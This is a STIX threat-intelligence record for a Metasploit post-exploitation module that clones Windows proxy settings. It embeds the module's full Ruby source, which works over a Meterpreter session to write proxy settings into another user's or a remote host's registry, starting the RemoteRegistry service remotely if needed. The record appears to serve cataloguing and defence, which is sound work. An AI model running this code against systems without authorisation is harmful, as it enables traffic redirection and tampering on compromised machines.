{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0906c5f5-2845-4463-a246-d7f53c8cf6d9",
    "created": "2024-08-14T16:33:04.997139Z",
    "modified": "2024-08-14T16:33:04.997142Z",
    "name": "Windows Manage Proxy Setting Cloner",
    "description": " This module copies the proxy settings from the current user to the targeted user SID, supports remote hosts as well if remote registry is allowed. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/clone_proxy_settings.rb",
            "external_id": "clone_proxy_settings.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name' => 'Windows Manage Proxy Setting Cloner',\n      'Description' => %q{\n        This module copies the proxy settings from the current user to the\n        targeted user SID, supports remote hosts as well if remote registry\n        is allowed.\n      },\n      'Author' => [ 'mubix' ],\n      'License' => MSF_LICENSE,\n      'Platform' => [ 'win' ],\n      'SessionTypes' => [ 'meterpreter' ],\n      'Compat' => {\n        'Meterpreter' => {\n          'Commands' => %w[\n            stdapi_registry_create_key\n            stdapi_registry_open_key\n            stdapi_registry_open_remote_key\n          ]\n        }\n      }\n    )\n\n    register_options(\n      [\n        OptAddress.new('RHOST', [ false, 'Remote host to clone settings to, defaults to local' ]),\n        OptString.new('SID', [ false, 'SID of user to clone settings to, defaults to SYSTEM', 'S-1-5-18' ])\n      ]\n    )\n  end\n\n  def parse_settings(data)\n    print_status \"\\tProxy Counter = #{data[4, 1].unpack('C*')[0]}\"\n    case data[8, 1].unpack('C*')[0]\n    when 1\n      print_status \"\\tSetting: No proxy settings\"\n    when 3\n      print_status \"\\tSetting: Proxy server\"\n    when 5\n      print_status \"\\tSetting: Set proxy via AutoConfigure script\"\n    when 7\n      print_status \"\\tSetting: Proxy server and AutoConfigure script\"\n    when 9\n      print_status \"\\tSetting: WPAD\"\n    when 11\n      print_status \"\\tSetting: WPAD and Proxy server\"\n    when 13\n      print_status \"\\tSetting: WPAD and AutoConfigure script\"\n    when 15\n      print_status \"\\tSetting: WPAD, Proxy server and AutoConfigure script\"\n    else\n      print_status \"\\tSetting: Unknown proxy setting found\"\n    end\n\n    cursor = 12\n    proxyserver = data[cursor + 4, data[cursor, 1].unpack('C*')[0]]\n    print_status \"\\tProxy Server: #{proxyserver}\" if proxyserver != ''\n\n    cursor = cursor + 4 + data[cursor].unpack('C*')[0]\n    additionalinfo = data[cursor + 4, data[cursor, 1].unpack('C*')[0]]\n    print_status \"\\tAdditional Info: #{additionalinfo}\" if additionalinfo != ''\n\n    cursor = cursor + 4 + data[cursor].unpack('C*')[0]\n    autoconfigurl = data[cursor + 4, data[cursor, 1].unpack('C*')[0]]\n    print_status \"\\tAutoConfigURL: #{autoconfigurl}\" if autoconfigurl != ''\n  end\n\n  def target_settings(dst_root_key, dst_base_key)\n    if datastore['RHOST']\n      begin\n        dst_key = session.sys.registry.open_remote_key(datastore['RHOST'], dst_root_key)\n      rescue ::Rex::Post::Meterpreter::RequestError\n        print_error(\"Unable to contact remote registry service on #{datastore['RHOST']}\")\n        print_status('Attempting to start service remotely...')\n        begin\n          service_start('RemoteRegistry', datastore['RHOST'])\n        rescue StandardError\n          print_error('Unable to read registry or start the service, exiting...')\n          return\n        end\n        startedreg = true\n        dst_key = session.sys.registry.open_remote_key(datastore['RHOST'], dst_root_key)\n      end\n      dst_open_key = dst_key.open_key(dst_base_key)\n    else\n      dst_open_key = session.sys.registry.open_key(dst_root_key, dst_base_key)\n    end\n\n    dst_values = dst_open_key.query_value('DefaultConnectionSettings')\n\n    # If we started the service we need to stop it.\n    service_stop('RemoteRegistry', datastore['RHOST']) if startedreg\n\n    dst_data = dst_values.data\n\n    print_status('Current proxy settings for target:')\n    parse_settings(dst_data)\n  end\n\n  def run\n    if (datastore['SID'] == '') && !datastore['RHOST']\n      print_error('No reason to copy the settings on top of themselves, please set a SID or/and RHOST')\n      return\n    end\n\n    # Pull current user's settings\n    src_root_key, src_base_key = session.sys.registry.splitkey('HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\Connections')\n    src_open_key = session.sys.registry.open_key(src_root_key, src_base_key)\n    src_values = src_open_key.query_value('DefaultConnectionSettings')\n    src_data = src_values.data\n    print_status('Proxy settings being copied:')\n    parse_settings(src_data)\n\n    # Print current settings of target\n    print_status('Attempting to read target\\'s settings...')\n    if datastore['SID']\n      dst_root_key, dst_base_key = session.sys.registry.splitkey(\"HKU\\\\#{datastore['SID']}\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\Connections\")\n    else\n      dst_root_key, dst_base_key = session.sys.registry.splitkey('HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\Connections')\n    end\n\n    target_settings(dst_root_key, dst_base_key)\n\n    print_status('Cloning... bahh..')\n\n    if datastore['RHOST']\n      begin\n        dst_key = session.sys.registry.open_remote_key(datastore['RHOST'], dst_root_key)\n      rescue ::Rex::Post::Meterpreter::RequestError\n        print_error(\"Unable to contact remote registry service on #{datastore['RHOST']}\")\n        print_status('Attempting to start service remotely...')\n        begin\n          service_start('RemoteRegistry', datastore['RHOST'])\n        rescue StandardError\n          print_error('Unable to read registry or start the service, exiting...')\n          return\n        end\n        startedreg2 = true\n        dst_key = session.sys.registry.open_remote_key(datastore['RHOST'], dst_root_key)\n      end\n      dst_open_key = dst_key.create_key(dst_base_key, KEY_WRITE + 0x0000)\n    else\n      dst_open_key = session.sys.registry.create_key(dst_root_key, dst_base_key, KEY_WRITE + 0x0000)\n    end\n\n    # If we started the service we need to stop it.\n    service_stop('RemoteRegistry', datastore['RHOST']) if startedreg2\n\n    dst_open_key.set_value('DefaultConnectionSettings', REG_BINARY, src_data)\n\n    print_status('New settings:')\n    target_settings(dst_root_key, dst_base_key)\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}